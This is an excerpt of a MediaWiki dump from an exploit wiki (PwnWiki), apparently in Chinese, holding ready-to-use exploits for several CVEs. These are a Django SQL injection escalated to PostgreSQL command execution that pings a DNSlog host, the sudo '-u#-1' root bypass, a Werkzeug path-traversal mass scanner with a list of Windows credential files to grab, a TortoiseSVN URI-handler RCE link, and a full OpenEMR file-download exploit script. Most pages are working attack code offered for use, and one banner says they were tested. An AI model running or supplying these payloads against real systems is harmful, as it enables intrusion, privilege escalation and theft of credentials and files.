&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

命令成功执行。

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>2fhqkxhpggd6l905pgkjwlpoabmqvoi</sha1>
    </revision>
    <revision>
      <id>7080</id>
      <parentid>7078</parentid>
      <timestamp>2021-07-12T08:01:14Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "访问："</comment>
      <origin>7080</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1263" sha1="nokhzj1msvogfewpgm4viqx866fwswb" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


访问以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

回显&lt;code&gt;no results to fetch&lt;/code&gt; 语句成功执行。

访问：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

命令成功执行。

===⚠️️===
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
&lt;code&gt;test.dnslog.cn&lt;/code&gt;請修改爲自己的Dnslog
&lt;/div&gt;</text>
      <sha1>nokhzj1msvogfewpgm4viqx866fwswb</sha1>
    </revision>
    <revision>
      <id>7081</id>
      <parentid>7080</parentid>
      <timestamp>2021-07-12T08:02:06Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "&lt;code&gt;test.dnslog.cn&lt;/code&gt;请修改为自己的DNSlog"</comment>
      <origin>7081</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1202" sha1="80d7onb675uie2vn07xpfezka6463s9" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


访问以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

回显&lt;code&gt;no results to fetch&lt;/code&gt; 语句成功执行。

访问：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

命令成功执行。

===⚠️️===
&lt;code&gt;test.dnslog.cn&lt;/code&gt;请修改为自己的DNSlog</text>
      <sha1>80d7onb675uie2vn07xpfezka6463s9</sha1>
    </revision>
    <revision>
      <id>7083</id>
      <parentid>7081</parentid>
      <timestamp>2021-07-12T08:31:33Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <origin>7083</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1202" sha1="fbwv7bdzjjrdh4g9i3ix1ad9bfzathy" xml:space="preserve">&lt;languages   /&gt;

==影响版本==
&lt;pre&gt;
Django 2.2.x &lt; 2.2.4

Django 2.1.x &lt; 2.1.11

Django 1.11.x &lt; 1.11.23
&lt;/pre&gt;

==漏洞利用==

首先需登录管理员后台，访问模型Collection的管理页面：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27
&lt;/pre&gt;

&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__a%27)%3D%271%27%20or%201%3d1%20--
&lt;/pre&gt;

Django一般与PostgreSQL一起配合使用，可以尝试利用PostgreSQL 高权限命令执行漏洞[https://www.pwnwiki.org/index.php?title=CVE-2019-9193_PostgreSQL_%E9%AB%98%E6%AC%8A%E9%99%90%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E (CVE-2019-9193)]


访问以下URL：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_execs(cmd_output%20text)--%20
&lt;/pre&gt;

回显&lt;code&gt;no results to fetch&lt;/code&gt; 语句成功执行。

访问：
&lt;pre&gt;
http://127.0.0.1/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_execs%20FROM%20PROGRAM%20%27ping%20test.dnslog.cn%20%27--%20
&lt;/pre&gt;

命令成功执行。

===⚠️️===
&lt;code&gt;test.dnslog.cn&lt;/code&gt;请修改为自己的Dnslog</text>
      <sha1>fbwv7bdzjjrdh4g9i3ix1ad9bfzathy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14287 Sudo權限繞過漏洞</title>
    <ns>0</ns>
    <id>1565</id>
    <revision>
      <id>1953</id>
      <timestamp>2021-04-30T07:09:48Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "=== Info ===  [https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability CVE-2019-14287 sudo Vulnerability Allows Bypass of User Restrictions]  ==== 利用要求 ====..."</comment>
      <origin>1953</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="425" sha1="aptdo3mu2ijfaukryzzkr2ilsi8op8f" xml:space="preserve">=== Info ===

[https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability CVE-2019-14287 sudo Vulnerability Allows Bypass of User Restrictions]

==== 利用要求 ====

&lt;li&gt;sudo版本低於v1.8.28&lt;/li&gt;

&lt;li&gt;/etc/sudoers 配置要求如下(要求一組特定權限,不一定完全是下面的樣子)&lt;/li&gt;
 
==== 示例 ====
&lt;pre&gt;&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL&lt;/pre&gt;

=== EXP ===

&lt;pre&gt;
sudo -u#0 whoami
root
&lt;/pre&gt;</text>
      <sha1>aptdo3mu2ijfaukryzzkr2ilsi8op8f</sha1>
    </revision>
    <revision>
      <id>1954</id>
      <parentid>1953</parentid>
      <timestamp>2021-04-30T07:10:54Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>/* EXP */</comment>
      <origin>1954</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="418" sha1="dtzebfucut7c0q2vcsx77t2kg00z58q" xml:space="preserve">=== Info ===
[https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability CVE-2019-14287 sudo Vulnerability Allows Bypass of User Restrictions]
==== 利用要求 ====
&lt;li&gt;sudo版本低於v1.8.28&lt;/li&gt;
&lt;li&gt;/etc/sudoers 配置要求如下(要求一組特定權限,不一定完全是下面的樣子)&lt;/li&gt;
==== 示例 ====
&lt;pre&gt;&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL&lt;/pre&gt;
=== EXP ===
&lt;pre&gt;
sudo -u#-1 whoami
root
&lt;/pre&gt;</text>
      <sha1>dtzebfucut7c0q2vcsx77t2kg00z58q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14322 Pallets Werkzeug 0.15.4 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>5595</id>
    <revision>
      <id>6428</id>
      <timestamp>2021-07-07T02:51:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Pallets Werkzeug 0.15.4 - Path Traversal # Date: 06 July 2021 # Original Author: Emre ÖVÜNÇ # Exploit Author: faisalfs10x (https://github.com/faisalf..."</comment>
      <origin>6428</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4483" sha1="l7lnij678teuj75hxptihbgq3dyh0hq" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Pallets Werkzeug 0.15.4 - Path Traversal
# Date: 06 July 2021
# Original Author: Emre ÖVÜNÇ
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://palletsprojects.com/
# Software Link: https://github.com/pallets/werkzeug
# Version: Prior to 0.15.5
# Tested on: Windows Server
# CVE: 2019-14322
# Credit: Emre Övünç and Olivier Dony for responsibly reporting the issue
# CVE Link: https://nvd.nist.gov/vuln/detail/CVE-2019-14322
# Reference : https://palletsprojects.com/blog/werkzeug-0-15-5-released/

Description : Prior to 0.15.5, it was possible for a third party to potentially access arbitrary files when the application used SharedDataMiddleware on Windows. Due to the way Python's os.path.join() function works on Windows, a path segment with a drive name will change the drive of the final path. TLDR; In Pallets Werkzeug before 0.15.5, SharedDataMiddleware mishandles drive names (such as C:) in Windows pathnames lead to arbitrary file download.

#!/usr/bin/env python3
# PoC code by @faisalfs10x [https://github.com/faisalfs10x]

""" $ pip3 install colorama==0.3.3, argparse, requests, urllib3
    $ python3 CVE-2019-14322.py -l list_target.txt"
"""
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
from colorama import Fore, Back, Style, init

# Colors
red = '\033[91m'
green = '\033[92m'
white = '\033[97m'
yellow = '\033[93m'
bold = '\033[1m'
end = '\033[0m'

init(autoreset=True)

def banner_motd():
    print(Fore.CYAN +Style.BRIGHT +"""                                                                

        CVE-2019-14322 %sPoC by faisalfs10x%s - (%s-%s)%s %s 
""" % (bold, red, white, yellow, white, end))

banner_motd()

# list of sensitive files to grab in windows

# %windir%\repair\sam
# %windir%\System32\config\RegBack\SAM
# %windir%\repair\system
# %windir%\repair\software
# %windir%\repair\security
# %windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account)
# %windir%\iis6.log (5,6 or 7)
# %windir%\system32\logfiles\httperr\httperr1.log
# C:\sysprep.inf
# C:\sysprep\sysprep.inf
# C:\sysprep\sysprep.xml
# %windir%\Panther\Unattended.xml
# C:\inetpub\wwwroot\Web.config
# %windir%\system32\config\AppEvent.Evt (Application log)
# %windir%\system32\config\SecEvent.Evt (Security log)
# %windir%\system32\config\default.sav
# %windir%\system32\config\security.sav
# %windir%\system32\config\software.sav
# %windir%\system32\config\system.sav
# %windir%\system32\inetsrv\config\applicationHost.config
# %windir%\system32\inetsrv\config\schema\ASPNET_schema.xml
# %windir%\System32\drivers\etc\hosts (dns entries)
# %windir%\System32\drivers\etc\networks (network settings)
# %windir%\system32\config\SAM
# TLDR:
# C:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml
# C:/windows/system32/inetsrv/config/applicationHost.config
# C:/windows/system32/logfiles/httperr/httperr1.log 
# C:/windows/debug/NetSetup.log - (may contain AD domain name, DC name, internal IP, DA account)
# C:/windows/system32/drivers/etc/hosts - (dns entries)
# C:/windows/system32/drivers/etc/networks - (network settings)

def check(url):

	# There are 3 endpoints to be tested by default, but to avoid noisy, just pick one :)
	for endpoint in [
			'https://{}/base_import/static/c:/windows/win.ini', 
			#'https://{}/web/static/c:/windows/win.ini', 
			#'https://{}/base/static/c:/windows/win.ini'
			]:
		try:

			url2 = endpoint.format(url)
			resp = requests.get(url2, verify=False, timeout=5)
			
			if 'fonts' and 'files' and 'extensions' in resp.text:
				print(Fore.LIGHTGREEN_EX +Style.BRIGHT +" [+] " +url2+ " : vulnerable====[+]")
				with open('CVE-2019-14322_result.txt', 'a+') as output:
					output.write('{}\n'.format(url2))
					output.close()

			else:
				print(" [-] " +url+ " : not vulnerable")

		except KeyboardInterrupt:
			exit('User aborted!')
		except:
			print(" [-] " +url+ " : not vulnerable")


def main(args):

    f = open(listfile, "r")
    for w in f:
        url = w.strip()
            
        check(url)
    
if __name__ == '__main__':

    try:

        parser = argparse.ArgumentParser(description='CVE-2019-14322')
        parser.add_argument("-l","--targetlist",required=True, help = "target list in file")
        args = parser.parse_args()
        listfile = args.targetlist

        main(args)

    except KeyboardInterrupt:
        exit('User aborted!')
            
&lt;/pre&gt;</text>
      <sha1>l7lnij678teuj75hxptihbgq3dyh0hq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14422 TortoiseSVN 1.12.1 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1603</id>
    <revision>
      <id>2006</id>
      <timestamp>2021-05-02T04:26:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; Document Title: =============== TortoiseSVN v1.12.1 - Remote Code Execution Vulnerability   References (Source): ==================== https://www.vulnerability-l..."</comment>
      <origin>2006</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5846" sha1="cojl869g4abjmy3pkwnj9qe5b4c88c6" xml:space="preserve">==EXP==
&lt;pre&gt;
Document Title:
===============
TortoiseSVN v1.12.1 - Remote Code Execution Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2188

Product:
https://osdn.net/projects/tortoisesvn/storage/1.12.1/Application/TortoiseSVN-1.12.1.28628-x64-svn-1.12.2.msi/

Ticket: https://groups.google.com/forum/#!forum/tortoisesvn

http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2019-14422

CVE-ID:
=======
CVE-2019-14422


Release Date:
=============
2019-08-13


Vulnerability Laboratory ID (VL-ID):
====================================
2188


Common Vulnerability Scoring System:
====================================
8.8


Vulnerability Class:
====================
Code Execution


Current Estimated Price:
========================
4.000€ - 5.000€


Product &amp; Service Introduction:
===============================
TortoiseSVN is a really easy to use Revision control / version control /
source control software for Windows.
It is based on Apache Subversion (SVN); TortoiseSVN provides a nice and
easy user interface for Subversion.
It is developed under the GPL. Which means it is completely free for
anyone to use, including in a commercial
environment, without any restriction. The source code is also freely
available, so you can even develop your
own version if you wish to. Since it's not an integration for a specific
IDE like Visual Studio, Eclipse or
others, you can use it with whatever development tools you like, and
with any type of file.

(Copy of the about page: https://tortoisesvn.net/about.html )


Abstract Advisory Information:
==============================
A vulnerability laboratory researcher (vxrl team) discovered a remote
code execution vulnerability in the TortoiseSVN v1.12.1 software.


Vulnerability Disclosure Timeline:
==================================
2019-08-13: Public Disclosure (Vulnerability Laboratory)

Affected Product(s):
====================
TortoiseSVN
Product: TortoiseSVN - Software 1.12.1


Discovery Status:
=================
Published


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Authentication Type:
====================
Pre auth - no privileges


User Interaction:
=================
Low User Interaction


Disclosure Type:
================
Independent Security Research


Technical Details &amp; Description:
================================
A remote code execution vulnerability has been uncovered in the official
TortoiseSVN v1.12.1 software.
The vulnerability typ allows remote attackers to execute arbitrary codes
to compromise a target computer system.

The URI handler of TortoiseSVN (Tsvncmd:) allows a customised diff
operation on Excel workbooks, which could be used to open remote
workbooks without protection from macro security settings to execute
arbitrary code.

The `tsvncmd:command:diff?path:[file1]?path2:[file2]` will execute a
customised diff on [file1] and [file2] based on the file extension.
For xls files, it will execute the script `diff-xls.js` using wscript,
which will open the two files for analysis without any macro
security warning. An attacker can exploit this by putting a macro virus
in a network drive, and force the victim to open the workbooks
and execute the macro inside. Since the macro is triggered through
wscript, to make the attack less visible, one could kill the wscript
process and quit the excel program after the code was executed.


Proof of Concept (PoC):
=======================
The vulnerability could be triggered by visiting a specially crafted URL
via web browser.
To reproduce the vulnerability, one could simply create a .url file or
open the URL with a browsers,
but a notification prompt may be shown for the latter case.

&lt;a
href='tsvncmd:command:diff?path:VBoxSvrvv.xlsm?path2:VBoxSvrvw.xlsx'&gt;Checkout
the Repo with TortoiseSVN&lt;/a&gt;

where VBoxSvrv is the remote network drive controlled by the attacker,
v.xlsm is the macro virus and w.xlsx is just an empty excel workbook.

Sources: https://www.vulnerability-lab.com/resources/documents/2188.rar
Password: 23vxrl23

PoC: Video
https://www.youtube.com/watch?v=spvRSC377vI


Security Risk:
==============
The security risk of the remote code execution vulnerability in the
software component is estimated as high.


Credits &amp; Authors:
==================
PingFanZettaKe [VXRL Team] -
https://www.vulnerability-lab.com/show.php?user=PingFanZettaKe


Disclaimer &amp; Information:
=========================
The information provided in this advisory is provided as it is without
any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability
and capability for a particular purpose. Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct,
indirect, incidental, consequential loss of business profits
or special damages, even if Vulnerability-Lab or its suppliers have been
advised of the possibility of such damages. Some states do
not allow the exclusion or limitation of liability for consequential or
incidental damages so the foregoing limitation may not apply.
We do not approve or encourage anybody to break any licenses, policies,
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
www.vulnerability-db.com
Services:   magazine.vulnerability-lab.com
paste.vulnerability-db.com 			infosec.vulnerability-db.com
Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php
vulnerability-lab.com/rss/rss_upcoming.php
vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php
vulnerability-lab.com/register.php
vulnerability-lab.com/list-of-bug-bounty-programs.php
            
&lt;/pre&gt;</text>
      <sha1>cojl869g4abjmy3pkwnj9qe5b4c88c6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-14530 OpenEMR 5.0.1.7 - 'fileName' 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>4767</id>
    <revision>
      <id>5490</id>
      <timestamp>2021-06-21T13:46:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "{| style="margin: auto; width: 750px;color:green;" | style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" | {| cellspacing="2px"  | valig..."</comment>
      <origin>5490</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4560" sha1="5h5j3zaw30fr6dp5zgyumnn3th0pkfp" xml:space="preserve">{| style="margin: auto; width: 750px;color:green;"
| style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" |
{| cellspacing="2px" 
| valign="middle" | [[Image:Check.png|50px]]
| &lt;strong&gt;該漏洞已通過驗證。&lt;/strong&gt;
|
| &lt;center&gt;本頁面的EXP/POC/Payload經測試可用，漏洞已經成功復現。&lt;/center&gt;
|}
|}
&lt;br&gt;&lt;noinclude&gt;

&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: All versions prior to 5.0.2

==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)
# Date 16.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_7.zip
# Version: All versions prior to 5.0.2
# Tested on: Ubuntu 18.04
# CVE: CVE-2019-14530
# CWE: CWE-22
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/CVE-2019-14530-Exploit/README.md
# Reference: https://raw.githubusercontent.com/Wezery/CVE-2019-14530/master/Path%20traversal%20and%20DoS.pdf

'''
Description:
An issue was discovered in custom/ajax_download.php in OpenEMR before 5.0.2 via the fileName parameter.
An authenticated attacker can download any file (that is readable by the user www-data)
from server storage. If the requested file is writable for the www-data user and the directory
/var/www/openemr/sites/default/documents/cqm_qrda/ exists, it will be deleted from server.
'''


'''
Banner:
'''
banner = """ 
 
 
 ______     _______     ____   ___  _  ___        _ _  _  ____ _____  ___  
 / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \      / | || || ___|___ / / _ \ 
| |    \ \ / /|  _| _____ __) | | | | | (_) |_____| | || ||___ \ |_ \| | | |
| |___  \ V / | |__|_____/ __/| |_| | |\__, |_____| |__   _|__) |__) | |_| |
 \____|  \_/  |_____|   |_____|\___/|_|  /_/      |_|  |_||____/____/ \___/ 
                        
                                            by Hacker5preme
                                                                            
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Path Traversal')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')
Filepath = input('[+] Filepath: ')


'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
if 'error=1&amp;site=' in auth.text:
    print('[-] Authentication failed')
    exit()
else:
    print('[+] Authentication successfull: ' + str(auth))


'''
Path Traversal:
'''
url_static = 'http://' + target_ip + ':' + target_port + openemr_path
url_dynamic = '/custom/ajax_download.php?fileName=../../../../../../../../..'
url_exploit = url_static + url_dynamic + Filepath
print('')
print('[+] Constructed malicious URL: ')

# Headers:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Exploit:
print('')
print('[+] Contents of ' + Filepath + ':')
print('')
getfile = session.get(url_exploit, headers = header)
print(getfile.text)
&lt;/pre&gt;</text>
      <sha1>5h5j3zaw30fr6dp5zgyumnn3th0pkfp</sha1>
    </revision>
    <revision>
      <id>5491</id>
      <parentid>5490</parentid>
      <timestamp>2021-06-21T13:47:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5491</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4571" sha1="7x8cswcfaab0gj8rk8q24dll66mcsnc" xml:space="preserve">{| style="margin: auto; width: 750px;color:green;"
| style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" |
{| cellspacing="2px" 
| valign="middle" | [[Image:Check.png|50px]]
| &lt;strong&gt;該漏洞已通過驗證。&lt;/strong&gt;
|
| &lt;center&gt;本頁面的EXP/POC/Payload經測試可用，漏洞已經成功復現。&lt;/center&gt;
|}
|}
&lt;br&gt;&lt;noinclude&gt;

&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: All versions prior to 5.0.2

==EXP==
&lt;pre&gt;
# Exploit Title: OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)
# Date 16.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_7.zip
# Version: All versions prior to 5.0.2
# Tested on: Ubuntu 18.04
# CVE: CVE-2019-14530
# CWE: CWE-22
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/CVE-2019-14530-Exploit/README.md
# Reference: https://raw.githubusercontent.com/Wezery/CVE-2019-14530/master/Path%20traversal%20and%20DoS.pdf

'''
Description:
An issue was discovered in custom/ajax_download.php in OpenEMR before 5.0.2 via the fileName parameter.
An authenticated attacker can download any file (that is readable by the user www-data)
from server storage. If the requested file is writable for the www-data user and the directory
/var/www/openemr/sites/default/documents/cqm_qrda/ exists, it will be deleted from server.
'''


'''
Banner:
'''
banner = """ 
 
 
 ______     _______     ____   ___  _  ___        _ _  _  ____ _____  ___  
 / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \      / | || || ___|___ / / _ \ 
| |    \ \ / /|  _| _____ __) | | | | | (_) |_____| | || ||___ \ |_ \| | | |
| |___  \ V / | |__|_____/ __/| |_| | |\__, |_____| |__   _|__) |__) | |_| |
 \____|  \_/  |_____|   |_____|\___/|_|  /_/      |_|  |_||____/____/ \___/ 
                        
                                            by Hacker5preme
                                                                            
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Path Traversal')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')
Filepath = input('[+] Filepath: ')


'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&amp;site=default'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'new_login_session_management': '1',
    'authProvider': 'Default',
    'authUser': username,
    'clearPass': password,
    'languageChoice': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
if 'error=1&amp;site=' in auth.text:
    print('[-] Authentication failed')
    exit()
else:
    print('[+] Authentication successfull: ' + str(auth))


'''
Path Traversal:
'''
url_static = 'http://' + target_ip + ':' + target_port + openemr_path
url_dynamic = '/custom/ajax_download.php?fileName=../../../../../../../../..'
url_exploit = url_static + url_dynamic + Filepath
print('')
print('[+] Constructed malicious URL: ')

# Headers:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Exploit:
print('')
print('[+] Contents of ' + Filepath + ':')
print('')
getfile = session.get(url_exploit, headers = header)
print(getfile.text)
&lt;/pre&gt;</text>
      <sha1>7x8cswcfaab0gj8rk8q24dll66mcsnc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-15715 MantisBT 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2754</id>
    <revision>
      <id>3253</id>
      <timestamp>2021-05-25T08:56:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
